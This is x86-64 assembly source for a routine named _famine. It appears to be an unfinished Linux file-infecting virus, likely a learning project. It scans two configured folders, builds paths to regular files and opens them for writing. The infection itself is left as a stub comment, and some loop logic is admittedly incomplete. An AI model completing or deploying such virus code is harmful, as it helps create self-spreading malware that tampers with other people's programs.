%include "header.asm"
[BITS 64]

section .text
    global _famine

_famine:
    ; maybe push ALL USEFULL REGISTERS to restore state before leaving infection
    push rbp
    mov rbp, rsp
    rel_init
    sub rsp, FILE_SIZE + LINUX_DIRENT
    mov r10b, 1

target_dir:
    cmp r10b, 1
    je .f1
    cmp r10b, 0
    je .f2
    .f1:
        lea rdi, [rel(hook.folder_1)]
        jmp open_dir
    .f2:
        mov r10b, 0
        lea rdi, [rel(hook.folder_2)]

open_dir:
    mov rsi, 0                              ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                              ; Quit if cannot OPEN
    jle quit    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                             ; offset struct dirent
    mov rdx, 1024
    syscall
    mov r8, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                            ; buffer offset

find_file:
    cmp rbx, r8
    jge next_dir
    lea rsi, [rsp + 256]                     ; struct
    add rsi, rbx                            ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                     ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]
    .filesize:   ; size with offset result in undefined behavior since d_name is char arr[256].
        sub rcx, rcx
        sub al, al
        not rcx
        cld
        repne scasb
        not rcx
        dec rcx
%ifdef DEBUG
    .print:
        mov r15, rcx
        lea rsi, [rsp + 256 + rbx + LDIRENT_64.d_name]
        mov rdx, rcx
        mov rdi, 1
        mov rax, SYS_WRITE
        syscall

        mov rdi, 1
        lea rsi, [rel(hook.newline)]
        mov rdx, 1
        mov rax, SYS_WRITE
        syscall
        lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]
        mov rcx, r15
%endif

target_file:
    ; push qword [rbx]
    mov rax, rdi
    lea rdi, [rsp]
    lea rsi, [rel(hook.folder_1)]
    .path_dir:
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file
%ifdef DEBUG
    lea rdi, [rsp]
    sub rcx, rcx
    sub al, al
    not rcx
    cld
    repne scasb
    not rcx
    dec rcx
    lea rsi, [rsp]
    mov rdi, 1
    mov rdx, rcx
    mov rax, SYS_WRITE
    syscall

    mov rdi, 1
    mov byte [rsi], 0xa
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
%endif
    lea rdi, [rsp]                  ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x2
    syscall
    test rax, rax
    je next_file
    ;; LOAD IN MEMORY



next_file:
    ; maybe RBX not valid anymore aswell.
    ; pop rbx
    mov rcx, FILE_SIZE
    .memset:
        lea rdi, [rsp]
        add rdi, rcx
        dec rcx
        mov byte [rdi], 0
        cmp rcx, 0
        jne .memset
        
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]               ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

next_dir:
    mov rcx, rbx ; maybe push RBX before
    .memset:
        lea rdi, [rsp + 256]                                             ; dirent buff
        add rdi, rcx
        dec rcx
        mov byte [rdi], byte 0
        cmp rcx, 0
        jne .memset
    cmp r10b, 1
    jge target_dir.f2

quit:
    mov rax, SYS_EXIT
    mov rdi, 0
    syscall

hook:
    .folder_1:
        db FOLDER_1, 0
    .folder_2:
        db FOLDER_2, 0
%ifdef DEBUG
    .newline:
        db 0xa, 0
%endif